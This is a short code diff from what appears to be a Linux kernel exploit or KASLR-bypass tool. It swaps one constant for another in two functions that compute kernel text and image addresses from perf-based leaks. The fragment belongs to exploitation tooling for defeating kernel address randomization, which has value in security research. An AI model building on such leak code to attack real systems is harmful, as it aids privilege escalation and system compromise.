@@ -329,7 +329,7 @@ long sched_setattr_tid(int tid, int nice_value) {
 }
 
 uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
-  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
+  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_LOAD;
 }
 
 uintptr_t kaslr_image_addr(uintptr_t image_addr) {
@@ -1041,7 +1041,7 @@ uint64_t perf_leak_text_base(void) {
         return 0;
     }
 
-    uint64_t text_base = (min_kip & ~(PERF_LEAK_ALIGN - 1)) + P0_KERNEL_PHYS_DELTA;
+    uint64_t text_base = (min_kip & ~(PERF_LEAK_ALIGN - 1)) + P0_KERNEL_PHYS_LOAD;
     if (text_base < KIMAGE_TEXT_BASE) {
         pr_warning("perf text-base out of range: %016llx\n", (unsigned long long)text_base);
         return 0;
